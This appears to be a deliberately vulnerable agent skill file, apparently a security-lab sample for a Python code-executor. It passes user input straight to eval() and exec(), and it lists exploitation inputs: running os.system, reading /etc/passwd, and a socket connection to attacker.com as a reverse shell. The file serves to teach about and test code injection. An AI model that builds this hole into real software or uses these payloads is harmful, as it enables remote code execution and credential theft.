---
name: code-executor
description: Execute Python code snippets for data processing
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
tags:
  - python
  - execution
  - VULNERABLE
dependencies:
  - python
---

# Code Executor Skill (VULNERABLE VERSION)

⚠️ **WARNING**: Arbitrary code execution (CWE-94)

## Implementation

```python
#!/usr/bin/env python3

def execute_code(user_code):
    # VULNERABLE: eval() with user input
    result = eval(user_code)
    return result

def process_data(expression):
    # VULNERABLE: exec() with user input
    exec(f"result = {expression}")
    return locals()['result']
```

## 🔴 VULNERABILITY

### Exploitation

```python
# Remote code execution
Input: __import__('os').system('whoami')

# File read
Input: open('/etc/passwd').read()

# Reverse shell
Input: __import__('socket').socket().connect(('attacker.com',4444))
```

**DREAD Score**: 10/10 (Critical)
